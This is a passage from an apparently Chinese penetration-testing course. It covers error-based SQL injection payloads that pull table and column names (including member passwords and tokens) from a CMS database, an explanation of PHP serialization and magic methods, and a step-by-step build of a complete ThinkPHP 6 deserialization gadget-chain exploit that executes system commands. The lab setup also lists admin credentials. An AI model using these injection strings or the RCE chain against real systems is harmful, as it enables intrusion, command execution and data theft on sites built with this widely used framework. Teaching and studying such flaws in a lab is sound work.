abcd' or updatexml(1,concat(0x7e,substring((select group_concat(table_name) from information_schema.tables where table_schema=database()),125,31),0x7e),1)#

abcd' or updatexml(1,concat(0x7e,substring((select group_concat(table_name) from information_schema.tables where table_schema=database()),156,31),0x7e),1)#

abcd' or updatexml(1,concat(0x7e,substring((select group_concat(table_name) from information_schema.tables where table_schema=database()),187,31),0x7e),1)#

...
```

> jz_article,jz_buylog,jz_classtype,jz_collect,jz_collect_type,jz_comment,jz_customurl,jz_fields,jz_hook,jz_layout,jz_level,jz_level_group,jz_links,jz_member,jz_member_group,jz_message,jz_molds,jz_orders,jz_page,jz_pict

![image-20240910201430568](https://image.201068.xyz/assets/31.PHP/image-20240910201430568.png)

![image-20240910201924473](https://image.201068.xyz/assets/31.PHP/image-20240910201924473.png)

![image-20240910202109576](https://image.201068.xyz/assets/31.PHP/image-20240910202109576.png)

![image-20240910202157272](https://image.201068.xyz/assets/31.PHP/image-20240910202157272.png)

![image-20240910202250830](https://image.201068.xyz/assets/31.PHP/image-20240910202250830.png)

![image-20240910202346481](https://image.201068.xyz/assets/31.PHP/image-20240910202346481.png)

![image-20240910202429946](https://image.201068.xyz/assets/31.PHP/image-20240910202429946.png)

###### 字段名

```sql
abcd' or updatexml(1,concat(0x7e,substring((select group_concat(column_name) from information_schema.columns where table_name='jz_member'),1,31),0x7e),1)#
```

> id,username,openid,pass,token,s

![image-20240910205406787](https://image.201068.xyz/assets/31.PHP/image-20240910205406787.png)



## 第六节 序列化与反序列化

### 1.什么事序列化与反序列化

我们可以将序列化理解为一种规则化。

大白话讲，就是使千奇百怪的有各种不同属性的对象能以一种同样的形式（字符串形式）存储（序列化），当使用这个对象的时候，就是用规则的逆向将它还原为我们思维中的对象实例（反序列化）。下图显示脑海中对一个对象的构图：

![image-20240907154741854](https://image.201068.xyz/assets/31.PHP/image-20240907154741854.png)

创建了一个”男神“类的对象”我“，具有“**高、富、帅**”三个属性，这就是我们正常思维的样子。

经过大脑处理记忆(规则化)之后就变成什么样子了呢?

没错，纯文本。

由一种抽象化的形式 变成 了一种更简约更具体的字符串的体现形式。

简而言之，对象是抽象的实体，**序列化就是对一个对象按照特定规则的具体描述**。

#### PHP序列化 public

我们来看个简单的PHP代码的例子（注意变量都是`public`的）：

```php
<?php

class God{

public $high = '180';

public $money = '0';

public $face = '999';

}

$me = new God;

echo serialize($me);

?>

//O:3:"God":3:{s:4:"high";s:3:"180";s:5:"money";s:1:"0";s:4:"face";s:3:"999";}
```

![image-20240911110507969](https://image.201068.xyz/assets/31.PHP/image-20240911110507969.png)

#### 序列化格式

由此我们可以得到PHP中序列化后的字符串格式

```php
O:<length>:"<class name>":<n>:{<field name 1>;<field value 1>;...;<field name n>;<field value n>}
```

其中：

- `O`表示(object)整个字符串是一个对象的序列化；
- `n`代表这个对象的属性个数；
- 所有属性由{}包裹；
- `<field name 1>`表示 属性名 例如：s:4:“high”；
  - s:4:表示” “中是四个字符的字符串
- `<field value 1>`表示 属性值 例如：s:3:“180”；
- 所有属性的各项（属性名和属性值为不同项）由”;“隔开。

#### PHP序列化 private

上边的例子所设的变量都是public的，那么`private`的呢？区别如下：

```php
<?php
class God{
    private $high = '180';
    private $money = '0';
    private $face = '999';
}
$me = new God;
$ser = serialize($me);
echo $ser .PHP_EOL;
echo urlencode($ser) .PHP_EOL;
?>
```

![image-20240911111200943](https://image.201068.xyz/assets/31.PHP/image-20240911111200943.png)

运行结果：

```PHP
O:3:"God":3:{s:9:" God high";s:3:"180";s:10:" God money";s:1:"0";s:9:" God face";s:3:"999";}
O%3A3%3A%22God%22%3A3%3A%7Bs%3A9%3A%22%00God%00high%22%3Bs%3A3%3A%22180%22%3Bs%3A10%3A%22%00God%00money%22%3Bs%3A1%3A%220%22%3Bs%3A9%3A%22%00God%00face%22%3Bs%3A3%3A%22999%22%3B%7D
```

发现有个小问题，明明长度是7的Godhigh，在序列化中却显示其长度为9？多了两个什么字符？

我们将输出结果使用urlencode()函数进行编码，发现使用private修饰则会在属性名前加上%00类名%00。

根据PHP官方文档的解释：

> 对象的私有成员（private修饰）具有加入成员名称的类名称;受保护的成员（protected修饰）在成员名前面加上'*'。这些前缀值在任一侧都有空字节。

这就要求我们如果要构造该序列化字符串时，需要补齐这两个空字节：

```bash
O:3:"God":3:{s:9:"%00God%00high";s:3:"180";s:10:"%00God%00money";s:1:"0";s:9:"%00God%00face";s:3:"999";}
```

这就是序列化，那么什么是反序列化？

### 2.反序列化漏洞的原理

**PHP反序列化就是在读取一段字符串然后将字符串反序列化成php对象。**

反序列化漏洞产生原因：

- `unserialize()`传入的参数可控是主要原因
- `unserialize()`传入的参数无过滤(过滤被绕过)
- PHP类中的魔法函数自动调用

先看一个简单的例子：

```php
<?php
class demo{
    public $words = 'Good man';
    public function __destruct(){
        echo $this->words;
    }
}
$you = new demo;
if(isset($_GET['data'])){
    $other = $_GET['data'];
    $me = unserialize($other);
}
?>

//输出：Good man
```

由于上述代码存在unserialize()函数且其参数是用户可控的，无任何过滤，我们可以构造如下EXP：

```php
<?php

class demo{

    public $words = 'HACKKKKKK';

}

$evil = serialize(new demo);

echo $evil;

?>

//O:4:"demo":1:{s:5:"words";s:9:"HACKKKKKK";}


```

在URL中直接将该输出的序列化字符串赋给data变量，构造payload：

```
?data=O:4:%22demo%22:1:{s:5:%22words%22;s:9:%22HACKKKKKK%22;}
```

轻轻点一下回车就可以看到HACKKKKKK被输出了。

总结一下就是一句话：

**反序列化使用户可自定义某个类的对象以达到任意执行类中魔法函数内的操作。**

再看一个相似的__wakeup()（执行unserialize()时，先会调用这个函数）的简单例子了解一下什么是数据流。

```php
<?php

class demo{

    public $words = "Good man";

    public function __wakeup()
    {

        $this->evil($this->words);

    }

    public function evil($words){

        echo $words;

    }

}

$you = new demo;

unserialize(serialize($you));

?>

//?hack=O:4:%22demo%22:1:{s:5:%22words%22;s:9:%22HACKKKKKK%22;}
//HACKKKKKK
```

这段正常的代码显示了一个简单的数据传输流：`unserialize()` 调用 `__wakeup` 调用 类自定义的方法evil()，其中"`HACKKKKKK`"先由`$this->words` 调用 传给evil()函数 再 由其输出。

总结：

- 序列化是一种规则化，将复杂和不同的对象以一种特定的规则转变为相似结构的字符串。
- 反序列化可以让我们构造具有特定属性和方法的对象实例。

### 3.反序列化常用的魔术方法

#### 1.魔术方法

| 方法名       | 调用条件                                                     |
| :----------- | :----------------------------------------------------------- |
| __call       | 调用不可访问或不存在的方法时被调用                           |
| __callStatic | 调用不可访问或不存在的静态方法时被调用                       |
| __clone      | 进行对象clone时被调用，用来调整对象的克隆行为                |
| __constuct   | 构建对象的时被调用；                                         |
| __debuginfo  | 当调用var_dump()打印对象时被调用（当你不想打印所有属性）适用于PHP5.6版本 |
| __destruct   | 明确销毁对象或脚本结束时被调用；                             |
| __get        | 读取不可访问或不存在属性时被调用                             |
| __invoke     | 当以函数方式调用对象时被调用                                 |
| __isset      | 对不可访问或不存在的属性调用isset()或empty()时被调用         |
| __set        | 当给不可访问或不存在属性赋值时被调用                         |
| __set_state  | 当调用var_export()导出类时，此静态方法被调用。用__set_state的返回值做为var_export的返回值。 |
| __sleep      | 当使用serialize时被调用，当你不需要保存大对象的所有数据时很有用 |
| __toString   | 当一个类被转换成字符串时被调用                               |
| __unset      | 对不可访问或不存在的属性进行unset时被调用                    |
| __wakeup     | 当使用unserialize时被调用，可用于做些对象的初始化操作        |

#### 2.反序列化的常见起点

`__wakeup` 一定会调用

`__destruct` 一定会调用

`__toString` 当一个对象被反序列化后又被**当做字符串**使用

#### 3.反序列化的常见中间跳板:

`__toString` 当一个对象被**当做字符串**使用

`__get` **读取**不可访问或**不存在属性**时被调用

`__set` 当给不可访问或**不存在属性赋值**时被调用

`__isset` 对不可访问或不存在的属性调用isset()或empty()时被调用 形如 `$this->$func();`

#### 4.反序列化的常见终点:

`__call` 调用不可访问或不存在的方法时被调用

`call_user_func` 一般php代码执行都会选择这里

`call_user_func_array` 一般php代码执行都会选择这里

#### 演示

在PHP中以双下划线__为前缀开头的方法，统称为魔术方法（magic method）。

魔术方法都是系统定义好的特殊方法，在类或对象触发了某个事件之前或之后，自动调用执行，类中的其他普通方法需要手动进行调用。

如果希望根据自己的程序定制自己特殊功能的类，那么就需要对这些方法进行重写。

##### 常见的魔术方法

- `__construct()` 使用`new`关键字在类进行**实例化生成对象时**自动调用
- `__destruct()` **对象销毁时**自动调用，允许在销毁一个类之前执行一些操作，比如关闭文件，释放结果集等
- `__sleep()` 使用**serialize()函数时**自动调用
- `__wakeup()` 使用**unserialize()函数**之前调用
- `__toString()` 类被**当成字符串**进行拼接或输出时的调用方法，比如echo $obj;或者$obj."hello world"
- `__call()` 该方法在对象需要**调用的方法不存在时**，会自动调用，避免当调用的方法不存在时产生错误，而导致程序意外终止
- `__invoke()` **以调用函数的方式调用一个对象时**，自动调用的方法。比如`a = $obj()`
- `__set()` 给**不可访问（protected或private）的属性赋值时**自动调用
- `__get()` **读取不可访问（protected或private）的属性的值时**自动调用

- `__destruct()` 在php开发语言中，所有的**析构方法**都是在**对象销毁时自动调用**的方法。

##### 代码

```php
<?php

class Test{
    // 私有属性
    private $data = [];

    // 构造函数
    public function __construct(){
        echo '创建对象：'.'__construct run'.PHP_EOL;
    }

    // 析构函数
    public function __destruct(){
        echo '销毁对象：'.'__destruct run'.PHP_EOL;
    }
    // 将对象转换为字符串时触发
    public function __toString(){
        echo '当成字符串调用：'.'__toString run'.PHP_EOL;
        return 'str';
    }

    // 序列化时触发
    public function __sleep(){
        echo '使用序列化：'.'__sleep run'.PHP_EOL;
        return array('data');
    }

    // 反序列化时触发
    public function __wakeup(){
        echo '使用反序列化：'.'__wakeup run'.PHP_EOL;
    }

    public function __call($name, $arguments){
        echo '调用了不存在的方法：'.'__call run'.PHP_EOL;
    }

    // 当对象被当作函数调用时触发
    public function __invoke(...$args){
        echo '对象被当作函数调用：'.'__invoke run'.PHP_EOL;
    }

    // 当试图给一个私有或受保护的属性赋值时触发
    public function __set($name, $value){
        echo "给不可访问的属性设置值：".'__set run'.PHP_EOL;
        $this->data[$name] = $value;
    }

    // 当试图访问一个私有或受保护的属性时触发
    public function __get($name){
        if (isset($this->data[$name])) {
            echo "从不可访问的属性获取值：" .'__get run'.PHP_EOL;
            return $this->data[$name];
        } else {
            echo "尝试访问不存在的属性{$name}".PHP_EOL;
            return null;
        }
    }
}

// 对象被创建，会自动调用__construct()方法
$test = new Test();

// serialize序列化一个对象，先执行__sleep()方法，再进行序列化
$s = serialize($test);

// 反序列化unserialize()，先调用__wakeup()方法，预先准备对象需要的资源
$us = unserialize($s);

// 当做字符串，调用__toString()方法
$string = 'use test obj as str '.$test.PHP_EOL;

// 尝试调用不存在的方法，会调用__call()方法
$test->nonExistentMethod('arg1', 'arg2');

// 调用对象作为函数，会调用__invoke()方法
$test('param1', 'param2');

// 设置私有属性，会调用__set()方法
$test->privateProp = 'some value';

// 获取私有属性，会调用__get()方法
$a= $test->privateProp;
```

##### 运行结果

```php
创建对象：__construct run
使用序列化：__sleep run
使用反序列化：__wakeup run
当成字符串调用：__toString run
调用了不存在的方法：__call run
对象被当作函数调用：__invoke run
给不可访问的属性设置值：__set run
从不可访问的属性获取值：__get run
销毁对象：__destruct run
销毁对象：__destruct run
```

![image-20240911151458582](https://image.201068.xyz/assets/31.PHP/image-20240911151458582.png)

## 第七节 实战-寻找ThinkPHP反序列化漏洞

### 1.必备环境

#### 1）安装CMS项目

本次实战使用基于 ThinkPHP 6 框架开发的后台管理系统，首先下载项目源码包：

```bash
git clone https://github.com/yupoxiong/BearAdmin.git
```

在《PHP配套教学工具》中，已经提供压缩包 `BearAdmin.zip` ，

解压之后，将解压的`BearAdmin`目录放入Apache虚拟主机 `www.wasjpentest008.com` 目录下，

在phpEnv修改网站根目录为`BearAdmin`

![image-20240911151948414](https://image.201068.xyz/assets/31.PHP/image-20240911151948414.png)

#### 2）安装依赖

##### 修改php.ini

将extension=fileinfo取消注释

![image-20240911152107793](https://image.201068.xyz/assets/31.PHP/image-20240911152107793.png)

##### 安装Composer

![image-20240911152654536](https://image.201068.xyz/assets/31.PHP/image-20240911152654536.png)

```bash
composer
```

![image-20240911153100419](https://image.201068.xyz/assets/31.PHP/image-20240911153100419.png)

##### 镜像源

https://developer.aliyun.com/composer

###### 全局配置

```
composer config -g repo.packagist composer https://mirrors.aliyun.com/composer/
```

![image-20240911154103438](https://image.201068.xyz/assets/31.PHP/image-20240911154103438.png)

###### 取消配置

```
composer config -g --unset repos.packagist
```

##### 命令

###### 清除缓存

```bash
composer clear-cache
```

![image-20240911153557729](https://image.201068.xyz/assets/31.PHP/image-20240911153557729.png)

###### 安装

```bash
composer install
```

![image-20240911154415579](https://image.201068.xyz/assets/31.PHP/image-20240911154415579.png)

#### 3）配置CMS

##### 创建数据库

```bash
mysql -uroot -proot
create database bear_admin default character set utf8mb4 collate utf8mb4_unicode_ci;
```

![image-20240911154741303](https://image.201068.xyz/assets/31.PHP/image-20240911154741303.png)

##### 修改项目下`.env`文件

```bash
[DATABASE]
TYPE=mysql
HOSTNAME=127.0.0.1
DATABASE=bear_admin
USERNAME=root
PASSWORD=root
HOSTPORT=3306
CHARSET=utf8mb4
DEBUG=true
```

![image-20240911154937685](https://image.201068.xyz/assets/31.PHP/image-20240911154937685.png)

##### 运行数据库迁移命令

```php
php think migrate:run
```

> 注意：
>
> 运行迁移命令的时候会生成2个用户，
>
> 开发管理员（ `develop_admin` ），超级管理（ `super_admin` ）。
>
> 超级管理员的密码会随机生成，注意迁移命令的输出内容。

![image-20240911155133614](https://image.201068.xyz/assets/31.PHP/image-20240911155133614.png)

![image-20240911160307778](https://image.201068.xyz/assets/31.PHP/image-20240911160307778.png)

> 开发管理员
>
> - 用户名:`develop_admin`
> - 密码:`GSesvBjgU5`
>
> 超级管理员
>
> - 用户名:`super_admin`
> - 密码:`pZMeGmJHCw`

```
开发管理员
用户名：develop_admin
密码：GSesvBjgU5

超级管理员
用户名：super_admin
密码：pZMeGmJHCw
```

#### 4）浏览器访问

在`phpEnv`中，将项目的**根目录**修改为`BearAdmin/public`

##### 访问后台页面：

http://www.wasjpentest008.com/index.php/admin/auth/login.html

![image-20240911155923703](https://image.201068.xyz/assets/31.PHP/image-20240911155923703.png)

> super_admin
>
> pZMeGmJHCw

![image-20240911160114347](https://image.201068.xyz/assets/31.PHP/image-20240911160114347.png)

###### 修改密码

![image-20240911160702616](https://image.201068.xyz/assets/31.PHP/image-20240911160702616.png)

![image-20240911161159593](https://image.201068.xyz/assets/31.PHP/image-20240911161159593.png)

```
super_admin
123456

develop_admin
123456
```



##### 访问前台页面：

http://www.wasjpentest008.com/index.php

![image-20240911160010543](https://image.201068.xyz/assets/31.PHP/image-20240911160010543.png)

### 2.寻找ThinkPHP反序列化利用链

#### 1）漏洞分析

反序列化漏洞触发条件：

在PHP中，反序列化漏洞入口点都是`__destruct()`**析构方法**，

查找框架中所有的析构方法，找到能够触发下一步的函数，并最终达到执行命令的目的。

##### IDE文件中查找

在IDE中选择**编辑->查找->在文件中查找...**

![image-20240911161500729](https://image.201068.xyz/assets/31.PHP/image-20240911161500729-1726042645363-4.png)

在框架中搜索`__destruct`，选择**作用域**，所有存在**__destruct()析构函数**的类如下图，

![image-20240911161717211](https://image.201068.xyz/assets/31.PHP/image-20240911161717211.png)

但是注意，并不是入口目标只有下面几个，要知道很多类都是抽象类，

也就是说，真正的入口很大程度上是他们的子类等，这样想的话，入口就多了很多。

#### 2）选定Model类的析构方法

我们选择Model类的__destruct()方法，

因为它的成员变量lazySave是可控的，

我们可以控制`lazySave=true`，使得能成功调用`save()`这个方法；

![image-20240911161845036](https://image.201068.xyz/assets/31.PHP/image-20240911161845036-1726042740368-6.png)

![image-20240911162038563](https://image.201068.xyz/assets/31.PHP/image-20240911162038563.png)

我们先尝试写exploit：

```php
<?php

namespace think{
    abstract class Model{
        private $lazySave = false;
        function __construct()
        {
            $this->lazySave = true;
        }
    }
}
```



#### 3）跟进save方法

在save方法中，我们要考虑进入`updateData()`方法，所以需要绕过前面的if判断语句。

![image-20240911162442311](https://image.201068.xyz/assets/31.PHP/image-20240911162442311.png)

![image-20240911162548798](https://image.201068.xyz/assets/31.PHP/image-20240911162548798.png)

首先要让`$this->isEmpty()`返回`false`，我们进入`isEmpty`方法查看。

![image-20240911162625540](https://image.201068.xyz/assets/31.PHP/image-20240911162625540.png)

`isEmpty`方法体逻辑很简单，只要`$this->data`属性**不为空**就可以返回一个`false`，那么我们暂时让 `$this-\>data=['']` 。

继续完善exploit：

```php
<?php

namespace think{

    abstract class Model{

        private $lazySave = false;

        private $data = [];

        function __construct()

        {

            $this->lazySave = true;

            $this->data = ['xxx'];

        }

    }
}
```

回到save方法，if判断的第二个条件是不能让`$this->trigger`方法返回false，我们进入`$this->trigger`方法查看。

![image-20240911162809126](https://image.201068.xyz/assets/31.PHP/image-20240911162809126.png)

![image-20240911162901080](https://image.201068.xyz/assets/31.PHP/image-20240911162901080.png)

在trigger方法体开始就有个判断，只要让 `$this->withEvent=false` ，那么，trigger方法就返回`true`。



这样的话，save方法的第一个if判断语句就绕过了，进入下面的三元运算：

```php
$result = $this->exists ? $this->updateData() : $this->insertData($sequence);
```

![image-20240911163032209](https://image.201068.xyz/assets/31.PHP/image-20240911163032209.png)

`$this->exists`是我们可以控制的，只需让` $this->exists=true `就能进入`$this->updateData()`这个方法。

![image-20240911163056160](https://image.201068.xyz/assets/31.PHP/image-20240911163056160.png)

继续完善exploit：

```php
<?php

namespace think{

    abstract class Model{

        private $lazySave = false;

        private $data = [];

        protected $withEvent = true;

        private $exists = false;

        function __construct()

        {

            $this->lazySave = true;

            $this->data = ['xxx'];

            $this->withEvent = false;

            $this->exists = true;

        }

    }

}
```



#### 4）跟进updateData方法

在updateData方法体中，我们需要进入`checkAllowFields()`方法。

![image-20240911164214950](https://image.201068.xyz/assets/31.PHP/image-20240911164214950.png)

那么就必须绕过前两个if判断语句，不能让它们提前结束方法。



首先是`$this->trigger`方法不能返回`false`，刚才我们讲过，只要让 `$this->withEvent=false` ，那么，`trigger`方法就返回true。

第一个if判断语句就绕过了。

第二个if判断语句是不能让`$data`为空，我们进入`getChangedData`方法查看。

![image-20240911165104264](https://image.201068.xyz/assets/31.PHP/image-20240911165104264.png)

![image-20240911165259610](https://image.201068.xyz/assets/31.PHP/image-20240911165259610.png)

在`getChangedData`方法体中，只要让` $this->force=true` ，`$data`就可以得到`$this->data`的值，上面我们讲过，`$this->data`不为空。

所以这个方法最终返回的`$data`不为空。

现在两个if判断都被绕过了,我们继续完善exploit：

```php
<?php

namespace think{

    abstract class Model{

        private $lazySave = false;

        private $data = [];

        protected $withEvent = true;

        private $exists = false;

        private $force = false;

        function __construct()

        {

            $this->lazySave = true;

            $this->data = ['xxx'];

            $this->withEvent = false;

            $this->exists = true;

            $this->force = true;

        }

    }

}
```

#### 5）跟进checkAllowFields方法

在`checkAllowFields`方法体中，我们目的是要进入`db()`方法。

![image-20240911165647299](https://image.201068.xyz/assets/31.PHP/image-20240911165647299.png)

![image-20240911165702915](https://image.201068.xyz/assets/31.PHP/image-20240911165702915.png)

那么就要` $this->field=[]`，`$this->schema=[] `，查看类的成员变量默认值，它们两个属性默认就是空的，

![image-20240911170117416](https://image.201068.xyz/assets/31.PHP/image-20240911170117416.png)

所以我们不用管，程序自然会进入`else`里的`$this->db()`方法。

#### 6）跟进db方法

在`db`方法体中，出现了`$this->name` 和`$this->suffix`字符串的拼接，还有`$this->table`和`$this->suffix`字符串拼接。

![image-20240911170201344](https://image.201068.xyz/assets/31.PHP/image-20240911170201344.png)

![image-20240911170241704](https://image.201068.xyz/assets/31.PHP/image-20240911170241704.png)

那么这里我们就可以思考一下，如果让`$this->table`作为一个对象，和字符串拼接，肯定会触发`__toString()`魔术方法。

那我们假定`$this->table`的值是一个对象，继续完善exploit：

```php
<?php

namespace think{

    abstract class Model{

        private $lazySave = false;

        private $data = [];

        protected $withEvent = true;

        private $exists = false;

        private $force = false;

        protected $table;

        function __construct($obj='')

        {

            $this->lazySave = true;

            $this->data = ['xxx'];

            $this->withEvent = false;

            $this->exists = true;

            $this->force = true;

            $this->table = $obj;

        }

    }

}
```



#### 7）选择Conversion类触发__toString方法

好多类有`__toString()`方法，我们要选择一个有利用链的类，比如`Conversion`类。

![image-20240911171622432](https://image.201068.xyz/assets/31.PHP/image-20240911171622432.png)

`Conversion`类是一个`trait`修饰的类，是为了代码复用，被其他类使用（use）的一个类，它是无法进行实例化成为一个对象的。

我们可以查找哪个类使用了`Conversion`类，它的子类也会继承`__toString()`这个方法。

我们在项目中进行搜索哪个类使用了`Conversion`：

![image-20240911171654721](https://image.201068.xyz/assets/31.PHP/image-20240911171654721.png)

![image-20240911171714849](https://image.201068.xyz/assets/31.PHP/image-20240911171714849.png)

我们刚开始选择的Model类就use了Conversion类，但是Model类是一个抽象类（abstract修饰），也是无法实例化成为一个对象的，我们还需要继续查找**继承了Model类的子类**。

查找关键字“`extends Model`”：

![image-20240911170751569](https://image.201068.xyz/assets/31.PHP/image-20240911170751569.png)

从搜索结果中看到，`Pivot`类继承了Model类，并且是一个正常的可以被实例化的类，那我么就使用Pivot类实例化为对象传给`$this->table`，成为字符串拼接触发时使用的对象。

![image-20240911170852601](https://image.201068.xyz/assets/31.PHP/image-20240911170852601.png)

那我们继续补充exploit：

```php
<?php

namespace think{

    abstract class Model{

        private $lazySave = false;

        private $data = [];

        protected $withEvent = true;

        private $exists = false;

        private $force = false;

        protected $table;

        function __construct($obj='')

        {

            $this->lazySave = true;

            $this->data = ['xxx'];

            $this->withEvent = false;

            $this->exists = true;

            $this->force = true;

            $this->table = $obj;

        }

    }

}

namespace think\model{

    use think\Model;

    class Pivot extends Model{}

    $p = new Pivot(new Pivot());

    echo urlencode(serialize($p));

}
```



#### 8）跟进__toString方法

方法体内部直接调用了`$this->toJson()`方法。

![image-20240911171751722](https://image.201068.xyz/assets/31.PHP/image-20240911171751722.png)

#### 9）跟进toJson方法

在toJson方法中直接调用了`$this->toArray()`方法。

![image-20240911171810537](https://image.201068.xyz/assets/31.PHP/image-20240911171810537.png)

#### 10）跟进toArray方法

这个方法体有点长，看起来有点复杂，其实关键在于第`254`行，去调用getAttr()方法，条件是`$visible[$key]`存在，而`$key`来自于`$data`的键名，也是`$data`的`key`。

![image-20240911171853311](https://image.201068.xyz/assets/31.PHP/image-20240911171853311-1726046374407-8.png)

![image-20240911172008600](https://image.201068.xyz/assets/31.PHP/image-20240911172008600.png)

而`$data`来自于`$this->data`，`$this->data`在上面我们讲过，它最起码是一个数组。

所以传入`getAttr()`方法的值就是`$this->data`这个数组的key。

![image-20240911172148931](https://image.201068.xyz/assets/31.PHP/image-20240911172148931.png)

#### 12）跟进getAttr方法

`getAttr`方法接收的参数`$name`就是`$this->data`的key。

![image-20240911172243911](https://image.201068.xyz/assets/31.PHP/image-20240911172243911.png)

#### 13）跟进getData方法

同样，`$name`的值是`$this->data`的`key`，第一个if判断语句就会绕过，进入`$this->getRealFieldName`方法。

![image-20240911172313852](https://image.201068.xyz/assets/31.PHP/image-20240911172313852.png)

#### 14）跟进getRealFieldName方法

分析方法体内部逻辑，它可以返回两种形式：

- `return Str::snake($name)`，这个方法简单说就是转换字符串为蛇形拼接，例如：HelloWorld->Hello_World；
- `return $name`，即传入传出保持不变；

![image-20240911172338950](https://image.201068.xyz/assets/31.PHP/image-20240911172338950.png)

如果传入字段名为驼峰命名格式（`$this->convertNameToCamel=>true`）且为不为严格模式（`$this->strict=>false`）则返回` Str::snake($name)`。否则正常回传字段名。

所以如果 `$data `数组的键名 key 不为驼峰命名格式即` $this->convertNameToCamel=>false `且 `$this->strict=>true`，那么直接返回正常 `$data`数组的键名 key。

再返回 `getData()` 方法，此时 `$filedName` 为 `$data` 数组的键名 key。

进入第296行判断（`$filedName`是否存在于` $data `数组的键名 key），返回值就为相应 key 的 value 值。

继续返回 `getAttr()` 方法，此时给 `getValue()` 方法传入的三个参数` $name, $value, $relation` 分别为数组的 `$data`的`key、$data[key]=value、false`。

![image-20240911172855745](https://image.201068.xyz/assets/31.PHP/image-20240911172855745.png)

#### 15）跟进getValue方法

在这个方法体内部，我们需要饶过第1个if判断语句，进入第2个if判断语句，绕过第3个if判断语句，进入第4个判断语句。

![image-20240911172919744](https://image.201068.xyz/assets/31.PHP/image-20240911172919744.png)

首先第1个判断语句，只要传入的`$name`（其实是`$this->data`数组的key）不存在`$this->get`里面就可以，这个`$name`是我们自主可控的，所以肯定不会存在get里面，所以第1个if判断语句绕过。

要进入第2个if判断语句，就要满足`$this->withAttr[$fieldName]`存在，我们可以想象到，让`$this->withAttr`和`$this->data`两个数组保持一致，即可进入。

![image-20240911173458569](https://image.201068.xyz/assets/31.PHP/image-20240911173458569.png)

第3个if判断必定可以绕过，因为传入的`$relation`是`false`。

要进入第4个if判断需要满足两个条件：`$this->data `的 key 是$this->json数组的元素`$this->json=['xxx']、$this->withAttr[key] `为数组。

根据以上分析，我们继续编写exploit：

```php
<?php

namespace think;

abstract class Model

{

    private $lazySave = false;

    private $data = [];

    protected $withEvent = true;

    private $exists = false;

    private $force = false;

    protected $table;

    private $withAttr = [];

    protected $json = [];

    function __construct($obj='')

    {

        $this->lazySave = true;

        $this->data = ['xxx' => []];

        $this->withEvent = false;

        $this->exists = true;

        $this->force = true;

        $this->table = $obj;

        $this->withAttr = ['xxx' => []];

        $this->json = ['xxx'];
    }

}

namespace think\model{

    use think\Model;

    class Pivot extends Model{}

    $p = new Pivot(new Pivot());

    echo urlencode(serialize($p));

}
```



#### 16）跟进getJsonValue方法

此时，传入的参数`$name，$​value`都可控，都为`$this->data`这个数组的键和值。

![image-20240911173624739](https://image.201068.xyz/assets/31.PHP/image-20240911173624739.png)

```php
$this->data[$name] = $value
```

第551行的判断，只要$value**不为空**即可绕过。



第555行foreach循环语句将 `$this->withAttr `数组中`$name`（从` $this->data` 来的 key，所以也再次明确withAttr 和 value 数组要保持一致）的键作为 key，值为` $closure`。

同时需要满足 `$this->jsonAssoc= true `，不要忘记加入到exploit里。

![image-20240911173854741](https://image.201068.xyz/assets/31.PHP/image-20240911173854741.png)

进入第557行漏洞触发点，让`$closure`成为我们想执行的函数名，`$value（$this->data[$name]）`为参数既可实现任意函数执行。

为什么说第557行时漏洞触发点呢？我们倒推一下，将$closure看做是一个执行系统命令的函数，比如：`system($value[$key], $value)`。

`$this->withAttr[$name] as $key => $closure` 即将 `['xxx'=>['system']]` 中的值在作为键值，那么键 key =0 ，值 `$closure = system`,那么得出 `$this->withAttr=['xxx' => ['system']]` 。

现在我们得到了`system($value[$key], $value)`这样形式的结果，我们先看一个`system()`函数的语法结构：

```php
system(string $command, int &$result_code = null): string|false
```

它的第一个参数传入的是`command`命令，那么就要求 `$value[$key] =`可执行的系统命令 ，由上面可知，key=0，`$value`是$this->data[$name]的值，所以得出 `$this->data=['xxx' => ['whoami']]` 。

我们继续完善exploit：

```php
<?php

namespace think{
    abstract class Model{
        private $lazySave = false;
        private $data = [];
        protected $withEvent = true;
        private $exists = false;
        private $force = false;
        protected $table;
        private $withAttr = [];
        protected $json = [];
        protected $jsonAssoc = false;
        function __construct($obj='')
        {
            $this->lazySave = true;
            $this->data = ['xxx' => ['whoami']];
            $this->withEvent = false;
            $this->exists = true;
            $this->force = true;
            $this->table = $obj;
            $this->withAttr = ['xxx' => ['system']];
            $this->json = ['xxx'];
            $this->jsonAssoc = true;
        }
    }
}
namespace think\model{
    use think\Model;
    class Pivot extends Model{}
    $p = new Pivot(new Pivot());
    echo urlencode(serialize($p));
}
```

以上就是完整的反序列化利用链，

```php
<?php
// exploit 利用，漏洞利用
// RCE remote command execute  远程命令执行
// POC 检测性验证
namespace think{
    abstract class Model{
        private $lazySave = true;
        protected $withEvent = false;
        private $exists = true;
        private $data = [];
        private $withAttr = [];
        private $force = true;
        protected $table;
        protected $json = [];
        protected $jsonAssoc = false;
        function __construct($obj='')
        {
            $this->data = ['xxx' => ["calc"]];
            //$this->data = ['xxx' => ['whoami']];
            $this->table = $obj;
            $this->withAttr= ['xxx' => ["system"]];
            $this->json = ['xxx'];
            $this->jsonAssoc = true;
        }
    }
}

namespace think\model{
    use think\Model;
    class Pivot extends Model{}
    $p = new Pivot(new Pivot());
    $s = base64_encode(serialize($p));
    echo $s;
}

```

![image-20240911191649170](https://image.201068.xyz/assets/31.PHP/image-20240911191649170.png)

```php
